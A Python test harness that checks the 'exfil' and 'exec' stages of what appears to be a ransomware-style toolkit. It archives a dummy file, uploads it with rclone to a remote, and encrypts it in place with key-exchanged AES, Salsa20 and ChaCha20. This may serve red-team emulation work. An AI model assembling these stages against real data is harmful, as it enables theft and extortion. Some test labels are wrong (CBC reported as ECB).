#!/usr/bin/python3
import os
from hashlib import sha256
from Crypto.Cipher import AES,Salsa20,ChaCha20
from Crypto.Util.Padding import pad, unpad
from Crypto.Util import Counter
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PublicKey
from cryptography.hazmat.primitives import serialization
import tarfile
import shutil
import subprocess
from pathlib import Path
import io
import zstandard as zstd

def derive_x25519_keypair():
    entropy = os.urandom(32)
    digest = sha256(entropy).digest()
    priv_key = X25519PrivateKey.from_private_bytes(digest)
    pub_key = priv_key.public_key()
    return priv_key, pub_key, digest

# ===== No Test for recon shell scripts ============

# ===== Test exfil stage components ================
# == 1. Test tar+gz on 1 file ======================
# == 2. Test tar+zstd on 1 file ====================
# == 3. Test rclone copy via SFTP ==================
# Create dummy test file
test_fname="test"
testfile=f"{test_fname}.txt"
test_string="This is a file with dummy data for unit tests."
with open(testfile, "w+") as f:
    f.write(test_string)

# tar.gz
gz_file = f"{test_fname}.tar.gz"
try:
    with tarfile.open(gz_file, "w:gz") as tar:
        arcname = os.path.relpath(testfile, ".")
        tar.add(testfile, arcname=arcname)
except Exception as e:
    print(f"Gzip compression error: {e}")
print("tar.gz file test success!")
os.remove(gz_file)

zstd_file = f"{test_fname}.tar.zst"
try:
    with open(zstd_file, "wb") as f_out:
        cctx = zstd.ZstdCompressor(threads=2)
        with cctx.stream_writer(f_out) as zstd_writer:
            with tarfile.open(mode='w|', fileobj=zstd_writer) as tar:
                arcname = os.path.relpath(testfile, ".")
                tar.add(testfile, arcname=arcname)
except Exception as e:
    print(f"zStd compression error: {e}")
print("tar.zst file test success!")
os.remove(zstd_file)

remote = "backup:/uploads/test.txt"
subprocess.run(["rclone", "copyto", testfile, remote], check=True)

# ===== Test exec stage components =================
# == 1. Test x25519 crypto key generation ==========
# == 2. Test AES CTR/ECB, ChaCha20, Salsa20 encr ===

priv1, pub1, _ = derive_x25519_keypair()
priv2, pub2, _ = derive_x25519_keypair()

shared1 = priv1.exchange(pub2)
key1 = sha256(shared1).digest()
shared2 = priv2.exchange(pub1)
key2 = sha256(shared2).digest()
iv = os.urandom(16)
ctr = Counter.new(128, initial_value=int.from_bytes(iv, "big"))

# AES CTR Test
with open(f"{test_fname}.txt", "rb+") as f:
    cipher = AES.new(key1, AES.MODE_CTR, counter=ctr)
    data = f.read()
    ct = cipher.encrypt(data)
    f.seek(0)
    f.write(ct)

with open(f"{test_fname}.txt", "rb+") as f:
    cipher = AES.new(key2, AES.MODE_CTR, counter=ctr)
    pt = cipher.decrypt(f.read())
    f.seek(0)
    f.write(pt)

    if pt == test_string.encode(encoding="utf-8"):
        print("AES-CTR successful")
    else:
        print(pt)
        print("AES-CTR FAILED")

# AES CBC Test
with open(f"{test_fname}.txt", "rb+") as f:
    cipher = AES.new(key1, AES.MODE_CBC, iv=iv)
    ct = cipher.encrypt(pad(f.read(),16))
    f.seek(0)
    f.write(ct)

with open(f"{test_fname}.txt", "rb+") as f:
    cipher = AES.new(key2, AES.MODE_CBC, iv=iv)
    pt = unpad(cipher.decrypt(f.read()),16)
    f.seek(0)
    f.write(pt)
    f.truncate()

    if pt == test_string.encode(encoding="utf-8"):
        print("AES-ECB successful")
    else:
        print(pt)
        print("AES-ECB FAILED")

# Salsa20 Test
with open(f"{test_fname}.txt", "rb+") as f:
    cipher = Salsa20.new(key1, nonce=iv[:8])
    ct = cipher.encrypt(f.read())
    f.seek(0)
    f.write(ct)

with open(f"{test_fname}.txt", "rb+") as f:
    cipher = Salsa20.new(key2, nonce=iv[:8])
    pt = cipher.decrypt(f.read())
    f.seek(0)
    f.write(pt)

    if pt == test_string.encode(encoding="utf-8"):
        print("Salsa20 successful")
    else:
        print(pt)
        print("Salsa20 FAILED")

# ChaCha20 Test
with open(f"{test_fname}.txt", "rb+") as f:
    cipher = ChaCha20.new(key=key1, nonce=iv[:8])
    ct = cipher.encrypt(f.read())
    f.seek(0)
    f.write(ct)

with open(f"{test_fname}.txt", "rb+") as f:
    cipher = ChaCha20.new(key=key2, nonce=iv[:8])
    pt = cipher.decrypt(f.read())
    f.seek(0)
    f.write(pt)

    if pt == test_string.encode(encoding="utf-8"):
        print("ChaCha20 successful")
    else:
        print(pt)
        print("ChaCha20 FAILED")

os.remove(testfile)
